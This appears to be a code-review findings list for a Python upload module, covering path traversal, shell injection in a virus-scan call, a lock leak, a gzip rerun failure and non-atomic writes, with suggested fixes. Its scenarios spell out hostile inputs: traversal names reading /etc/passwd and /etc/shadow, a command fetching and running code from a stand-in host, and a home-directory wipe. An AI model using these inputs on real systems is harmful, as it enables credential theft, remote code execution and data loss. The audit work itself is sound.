findings.description: read_upload joins a request-supplied filename onto UPLOAD_DIR without sanitizing it. save_upload uses basename, but this function does not. An absolute path or '..' segments escape the upload directory.
findings.scenario: filename='../../../etc/passwd' reads /etc/passwd. filename='/etc/shadow' makes os.path.join discard UPLOAD_DIR and read that file.
findings.fix: name = os.path.basename(filename); path = os.path.realpath(os.path.join(UPLOAD_DIR, name)); if not path.startswith(os.path.realpath(UPLOAD_DIR) + os.sep): raise ValueError('invalid filename')

findings.description: virus_scan interpolates path into a shell string and runs it with shell=True, so shell metacharacters in the path are executed. Upload filenames are user-controlled.
findings.scenario: An upload named 'x; curl evil.sh|sh' or '$(rm -rf ~)' runs arbitrary commands when scanned.

findings.description: The lock is acquired and released manually. If open() or write() raises (disk full, permission error, bad name), release() is never called and every later save_upload deadlocks.
findings.scenario: One save with a name that fails open(), such as '..' or a full disk, leaves _write_lock held, and all later uploads block forever.
findings.fix:
with _write_lock:
    with open(os.path.join(UPLOAD_DIR, safe), 'wb') as f:
        f.write(data)

findings.description: gzip -k without -f fails if ARCHIVE_PATH.gz already exists, and check=True turns that into an exception. A repeated daily run therefore fails once the first output is left in place.
findings.scenario: The second call to compress_archive while daily.tar.gz exists raises CalledProcessError (gzip: file already exists).

findings.description: basename() does not reject empty names or '.' and '..'. The write is also not atomic, so concurrent readers can see a partial file. read_upload takes no lock.
findings.scenario: name='' or name='..' gives a path that is a directory, so open() raises IsADirectoryError (after the lock is already held). A reader hitting a file mid-write gets truncated content.
findings.fix: Reject safe in ('', '.', '..'). Write to a temp file in UPLOAD_DIR, then os.replace() it to the final name.
